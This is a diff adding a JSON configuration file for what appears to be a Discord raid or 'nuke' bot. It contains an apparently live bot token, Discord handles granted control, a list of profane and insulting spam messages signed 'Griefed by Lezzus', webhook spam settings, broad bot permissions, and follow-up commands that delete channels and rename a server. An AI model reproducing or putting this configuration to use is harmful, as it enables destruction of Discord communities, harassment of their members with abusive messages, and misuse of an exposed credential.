@@ -1,0 +1,64 @@
+{
+    "token": "ODIzNDYxNjQ0MTQyOTAzMzE3.YFhKaw.mb9OQVd92T-1FRmAJimzqdtMg1Q",
+    "permissions": [
+        "MatteGamer09#8650",
+		"glmascolo#0354",
+		"Tonno#0111",
+		"Hamster gix#0193"
+    ],
+    "bomb_messages": {
+        "random": 22,
+        "fixed": [
+            "Griefed by Lezzus",
+            "Griefed by Lezzus",
+            "Griefed",
+            "Destroyed",
+            "Fuck you men",
+            "Go playing fuckin fortnite game",
+            "Go fuck ur moms",
+            "You are pussys",
+            "Suck my dick",
+            "Griefed by Lezzus",
+            "Lezzus is OP",
+            "You are shitty",
+            "You are fortnite kid",
+            "You dont know me",
+            "You have been griefed",
+            "You are fucking men",
+            "You only know nothing",
+            "You make laugh",
+            "You are all dirty old bastard",
+            "You are Muthafucka",
+            "Go to Hell",
+            "You are fussock"
+        ]
+    },
+    "webhook_spam": {
+        "usernames": [
+            "\u200b",
+            "more names",
+            "more names2"
+        ],
+        "pfp_urls": [
+            null,
+            "link to image",
+            "link to image2"
+        ],
+        "contents": [
+            "@TKperson Hello C-real was here",
+            "C-REAL on top",
+            "Keep this under 2000 characters",
+            ":The_bot_can_use_any_emojis_in_all_the_servers_that_the_bot_is_in: <- that is not 1 character keep that in mind"
+        ]
+    },
+    "bot_permission": "2146958847",
+    "command_prefix": ".",
+    "bot_status": "dnd",
+    "verbose": 15,
+    "after": [
+        "aCat rip",
+        "aChannel Griefed-By-Lezzus rip",
+        "sn Griefed By Lezzus",
+        "si https://i.postimg.cc/SQLG0qnz/trasferimento.jpg"
+    ]
+}
